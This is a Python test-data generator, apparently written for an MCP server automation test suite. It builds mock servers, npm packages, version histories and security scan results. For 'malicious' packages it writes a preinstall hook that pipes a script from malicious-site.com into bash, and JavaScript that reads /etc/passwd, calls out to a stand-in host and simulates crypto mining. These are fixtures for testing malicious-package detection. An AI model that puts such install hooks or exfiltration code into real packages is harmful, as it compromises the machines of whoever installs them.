#!/usr/bin/env python3
"""
Test Data Generation Utilities

Provides factories and generators for creating test data, Mock MCP servers,
and test packages for comprehensive MCP automation testing.

Author: Claude AI Assistant (senior-automated-tester)
Created: 2025-08-15 UTC
Version: 1.0.0
"""

import json
import random
import string
import time
from pathlib import Path
from typing import Dict, List, Any, Optional, Generator
from dataclasses import dataclass, field
from faker import Faker


@dataclass
class MockMCPServer:
    """Mock MCP server definition for testing."""
    name: str
    package: str
    version: str = "1.0.0"
    wrapper: str = ""
    is_healthy: bool = True
    startup_time: float = 2.0
    memory_usage_mb: int = 50
    dependencies: List[str] = field(default_factory=list)
    api_features: List[str] = field(default_factory=list)
    configuration: Dict[str, Any] = field(default_factory=dict)
    
    def __post_init__(self):
        if not self.wrapper:
            self.wrapper = f"{self.name}.sh"
        if not self.api_features:
            self.api_features = ["health_check", "basic_commands"]


@dataclass
class TestPackage:
    """Test package definition for download testing."""
    name: str
    version: str
    size_bytes: int
    checksum: str
    dependencies: Dict[str, str] = field(default_factory=dict)
    vulnerabilities: List[Dict[str, Any]] = field(default_factory=list)
    is_malicious: bool = False
    download_url: str = ""
    
    def __post_init__(self):
        if not self.download_url:
            self.download_url = f"https://registry.npmjs.org/{self.name}/-/{self.name}-{self.version}.tgz"


class TestDataFactory:
    """Factory for generating comprehensive test data."""
    
    def __init__(self):
        self.fake = Faker()
        self._server_counter = 0
        self._package_counter = 0
    
    def create_mock_server(
        self,
        name: Optional[str] = None,
        healthy: bool = True,
        custom_config: Optional[Dict[str, Any]] = None
    ) -> MockMCPServer:
        """Create a Mock MCP server with realistic data."""
        if name is None:
            self._server_counter += 1
            name = f"test-server-{self._server_counter}"
        
        package_name = f"@modelcontextprotocol/server-{name.replace('-', '')}"
        
        # Generate realistic version
        major = random.randint(1, 3)
        minor = random.randint(0, 15)
        patch = random.randint(0, 30)
        version = f"{major}.{minor}.{patch}"
        
        # Generate realistic performance characteristics
        startup_time = random.uniform(1.0, 5.0) if healthy else random.uniform(10.0, 30.0)
        memory_usage = random.randint(30, 100) if healthy else random.randint(200, 500)
        
        # Generate dependencies
        dependencies = []
        if random.random() > 0.3:  # 70% chance of having dependencies
            dep_count = random.randint(1, 5)
            for _ in range(dep_count):
                dep_name = self.fake.word()
                dependencies.append(f"@{dep_name}/core")
        
        # Generate API features
        base_features = ["health_check", "basic_commands"]
        optional_features = ["advanced_commands", "streaming", "authentication", "metrics", "logging"]
        selected_features = base_features + random.sample(optional_features, random.randint(0, 3))
        
        # Generate configuration
        configuration = {
            "timeout": random.randint(10, 60),
            "max_connections": random.randint(10, 100),
            "log_level": random.choice(["debug", "info", "warn", "error"]),
            "enable_metrics": random.choice([True, False])
        }
        
        if custom_config:
            configuration.update(custom_config)
        
        return MockMCPServer(
            name=name,
            package=package_name,
            version=version,
            is_healthy=healthy,
            startup_time=startup_time,
            memory_usage_mb=memory_usage,
            dependencies=dependencies,
            api_features=selected_features,
            configuration=configuration
        )
    
    def create_server_collection(
        self,
        count: int = 5,
        healthy_ratio: float = 0.8
    ) -> List[MockMCPServer]:
        """Create a collection of Mock servers with varied characteristics."""
        servers = []
        healthy_count = int(count * healthy_ratio)
        
        for i in range(count):
            is_healthy = i < healthy_count
            server = self.create_mock_server(healthy=is_healthy)
            servers.append(server)
        
        return servers
    
    def create_test_package(
        self,
        name: Optional[str] = None,
        malicious: bool = False,
        vulnerable: bool = False
    ) -> TestPackage:
        """Create a test package with realistic characteristics."""
        if name is None:
            self._package_counter += 1
            name = f"@test/package-{self._package_counter}"
        
        # Generate version
        version = f"{random.randint(1, 3)}.{random.randint(0, 10)}.{random.randint(0, 20)}"
        
        # Generate size (realistic package sizes)
        if malicious:
            size_bytes = random.randint(50000, 500000)  # Larger suspicious packages
        else:
            size_bytes = random.randint(1000, 100000)  # Normal package sizes
        
        # Generate checksum
        checksum = "sha256:" + "".join(random.choices(string.hexdigits.lower(), k=64))
        
        # Generate dependencies
        dependencies = {}
        if random.random() > 0.2:  # 80% chance of having dependencies
            dep_count = random.randint(1, 8)
            for _ in range(dep_count):
                dep_name = self.fake.word()
                dep_version = f"^{random.randint(1, 5)}.{random.randint(0, 10)}.0"
                dependencies[dep_name] = dep_version
        
        # Generate vulnerabilities if requested
        vulnerabilities = []
        if vulnerable or malicious:
            vuln_count = random.randint(1, 3) if vulnerable else random.randint(2, 5)
            for i in range(vuln_count):
                severity = "critical" if malicious else random.choice(["low", "medium", "high"])
                vulnerability = {
                    "id": f"CVE-2023-{random.randint(10000, 99999)}",
                    "severity": severity,
                    "description": f"Test vulnerability {i+1}",
                    "affected_versions": [version],
                    "cvss_score": random.uniform(3.0, 9.0) if severity != "critical" else random.uniform(8.0, 10.0)
                }
                vulnerabilities.append(vulnerability)
        
        return TestPackage(
            name=name,
            version=version,
            size_bytes=size_bytes,
            checksum=checksum,
            dependencies=dependencies,
            vulnerabilities=vulnerabilities,
            is_malicious=malicious
        )
    
    def create_version_history(
        self,
        server_name: str,
        count: int = 5
    ) -> List[Dict[str, Any]]:
        """Create a version history for a server."""
        history = []
        base_time = time.time() - (count * 86400)  # Start from 'count' days ago
        
        for i in range(count):
            major = 1
            minor = i
            patch = random.randint(0, 5)
            version = f"{major}.{minor}.{patch}"
            
            history_entry = {
                "version": version,
                "timestamp": base_time + (i * 86400),
                "activation_time": random.uniform(5.0, 30.0),
                "health_check_passed": random.random() > 0.1,  # 90% success rate
                "rollback_available": i > 0
            }
            history.append(history_entry)
        
        return history
    
    def create_performance_baseline(
        self,
        server_name: str
    ) -> Dict[str, Any]:
        """Create performance baseline data for testing."""
        return {
            "server_name": server_name,
            "baseline_timestamp": time.time(),
            "metrics": {
                "health_check_time": random.uniform(1.0, 3.0),
                "startup_time": random.uniform(2.0, 8.0),
                "memory_usage_mb": random.randint(30, 80),
                "cpu_usage_percent": random.uniform(5.0, 25.0),
                "response_time_p95": random.uniform(100, 500),  # milliseconds
                "throughput_ops_per_sec": random.randint(50, 200)
            },
            "thresholds": {
                "health_check_time_max": 5.0,
                "startup_time_max": 15.0,
                "memory_usage_max_mb": 150,
                "cpu_usage_max_percent": 50.0,
                "response_time_p95_max": 1000
            }
        }
    
    def create_security_scan_result(
        self,
        package_name: str,
        risk_level: str = "low"
    ) -> Dict[str, Any]:
        """Create security scan result data."""
        vuln_counts = {
            "low": (0, 1),
            "medium": (1, 3),
            "high": (2, 5),
            "critical": (3, 8)
        }
        
        min_vulns, max_vulns = vuln_counts.get(risk_level, (0, 1))
        vulnerability_count = random.randint(min_vulns, max_vulns)
        
        vulnerabilities = []
        for i in range(vulnerability_count):
            severity = risk_level if risk_level != "low" else random.choice(["low", "medium"])
            vulnerabilities.append({
                "id": f"TEST-{random.randint(1000, 9999)}",
                "severity": severity,
                "description": f"Test security issue {i+1}",
                "cwe_id": f"CWE-{random.randint(100, 999)}",
                "cvss_score": random.uniform(3.0, 9.0)
            })
        
        return {
            "package_name": package_name,
            "scan_timestamp": time.time(),
            "risk_level": risk_level,
            "vulnerabilities": vulnerabilities,
            "scan_duration": random.uniform(1.0, 10.0),
            "dependencies_scanned": random.randint(5, 25),
            "checksum_verified": True
        }


class TestPackageGenerator:
    """Generator for creating realistic test packages and files."""
    
    def __init__(self, base_path: Path):
        self.base_path = Path(base_path)
        self.fake = Faker()
    
    def generate_package_json(
        self,
        package: TestPackage,
        target_dir: Path
    ) -> Path:
        """Generate a realistic package.json file."""
        package_json = {
            "name": package.name,
            "version": package.version,
            "description": self.fake.text(max_nb_chars=100),
            "main": "index.js",
            "scripts": {
                "start": "node index.js",
                "test": "jest",
                "build": "npm run compile"
            },
            "dependencies": package.dependencies,
            "keywords": [self.fake.word() for _ in range(random.randint(2, 6))],
            "author": self.fake.name(),
            "license": random.choice(["MIT", "Apache-2.0", "GPL-3.0", "BSD-3-Clause"])
        }
        
        if package.is_malicious:
            # Add suspicious scripts
            package_json["scripts"].update({
                "preinstall": "curl -s http://malicious-site.com/steal.sh | bash",
                "postinstall": "node malicious.js"
            })
        
        package_file = target_dir / "package.json"
        target_dir.mkdir(parents=True, exist_ok=True)
        
        with open(package_file, 'w') as f:
            json.dump(package_json, f, indent=2)
        
        return package_file
    
    def generate_source_files(
        self,
        package: TestPackage,
        target_dir: Path
    ) -> List[Path]:
        """Generate realistic source files for a package."""
        files = []
        
        # Main index.js
        index_content = self.generate_javascript_content(package.is_malicious)
        index_file = target_dir / "index.js"
        index_file.write_text(index_content)
        files.append(index_file)
        
        # README.md
        readme_content = f"""# {package.name}
        
{self.fake.text(max_nb_chars=200)}

## Installation

```bash
npm install {package.name}
```

## Usage

```javascript
const server = require('{package.name}');
server.start();
```
"""
        readme_file = target_dir / "README.md"
        readme_file.write_text(readme_content)
        files.append(readme_file)
        
        # Additional source files
        lib_dir = target_dir / "lib"
        lib_dir.mkdir(exist_ok=True)
        
        for i in range(random.randint(1, 4)):
            lib_file = lib_dir / f"module_{i}.js"
            lib_content = self.generate_javascript_content(package.is_malicious)
            lib_file.write_text(lib_content)
            files.append(lib_file)
        
        return files
    
    def generate_javascript_content(self, malicious: bool = False) -> str:
        """Generate JavaScript content for test files."""
        if malicious:
            # Generate suspicious JavaScript content
            return """
const fs = require('fs');
const crypto = require('crypto');
const os = require('os');

// Suspicious: Reading sensitive files
try {
    const passwd = fs.readFileSync('/etc/passwd', 'utf8');
    console.log('System info:', passwd);
} catch (e) {}

// Suspicious: Network communication
const https = require('https');
https.get('https://malicious-site.com/data', (res) => {
    // Exfiltrate data
});

// Suspicious: Crypto mining
setInterval(() => {
    crypto.createHash('sha256').update(Math.random().toString()).digest('hex');
}, 1);

module.exports = {
    start: () => console.log('Server started'),
    malicious: true
};
"""
        else:
            # Generate normal JavaScript content
            return f"""
const EventEmitter = require('events');

class {self.fake.word().capitalize()}Server extends EventEmitter {{
    constructor(options = {{}}) {{
        super();
        this.options = options;
        this.started = false;
    }}
    
    start() {{
        if (this.started) {{
            throw new Error('Server already started');
        }}
        
        this.started = true;
        this.emit('start');
        console.log('Server started successfully');
    }}
    
    stop() {{
        if (!this.started) {{
            throw new Error('Server not started');
        }}
        
        this.started = false;
        this.emit('stop');
        console.log('Server stopped');
    }}
    
    health() {{
        return {{
            status: this.started ? 'healthy' : 'stopped',
            uptime: process.uptime(),
            memory: process.memoryUsage()
        }};
    }}
}}

module.exports = {self.fake.word().capitalize()}Server;
"""
    
    def create_complete_package(
        self,
        package: TestPackage,
        target_dir: Path
    ) -> Dict[str, Any]:
        """Create a complete package with all files."""
        package_dir = target_dir / package.name.replace("/", "_")
        package_dir.mkdir(parents=True, exist_ok=True)
        
        # Generate package.json
        package_file = self.generate_package_json(package, package_dir)
        
        # Generate source files
        source_files = self.generate_source_files(package, package_dir)
        
        # Calculate actual size
        total_size = sum(f.stat().st_size for f in [package_file] + source_files if f.exists())
        
        return {
            "package": package,
            "package_dir": package_dir,
            "package_file": package_file,
            "source_files": source_files,
            "total_size": total_size,
            "file_count": len(source_files) + 1
        }


def create_test_scenarios() -> List[Dict[str, Any]]:
    """Create comprehensive test scenarios for various testing needs."""
    factory = TestDataFactory()
    
    scenarios = [
        {
            "name": "healthy_server_baseline",
            "description": "Baseline scenario with healthy server",
            "server": factory.create_mock_server(name="baseline-server", healthy=True),
            "expected_outcome": "success",
            "test_categories": ["integration", "health", "performance"]
        },
        {
            "name": "failing_server_recovery",
            "description": "Server failure and recovery scenario",
            "server": factory.create_mock_server(name="failing-server", healthy=False),
            "expected_outcome": "failure_with_recovery",
            "test_categories": ["rollback", "health"]
        },
        {
            "name": "high_load_stress_test",
            "description": "High load stress testing scenario",
            "servers": factory.create_server_collection(count=10, healthy_ratio=0.9),
            "expected_outcome": "performance_degradation",
            "test_categories": ["performance", "integration"]
        },
        {
            "name": "security_vulnerability_scan",
            "description": "Security vulnerability testing scenario",
            "package": factory.create_test_package(malicious=False, vulnerable=True),
            "expected_outcome": "vulnerabilities_detected",
            "test_categories": ["security"]
        },
        {
            "name": "malicious_package_detection",
            "description": "Malicious package detection scenario", 
            "package": factory.create_test_package(malicious=True),
            "expected_outcome": "threat_blocked",
            "test_categories": ["security"]
        },
        {
            "name": "version_compatibility_matrix",
            "description": "Version compatibility testing across multiple versions",
            "version_matrix": [
                ("1.0.0", "1.0.1", "patch_compatible"),
                ("1.0.0", "1.1.0", "minor_compatible"), 
                ("1.0.0", "2.0.0", "major_incompatible"),
                ("2.0.0", "1.9.0", "downgrade_incompatible")
            ],
            "expected_outcome": "compatibility_validation",
            "test_categories": ["compatibility"]
        }
    ]
    
    return scenarios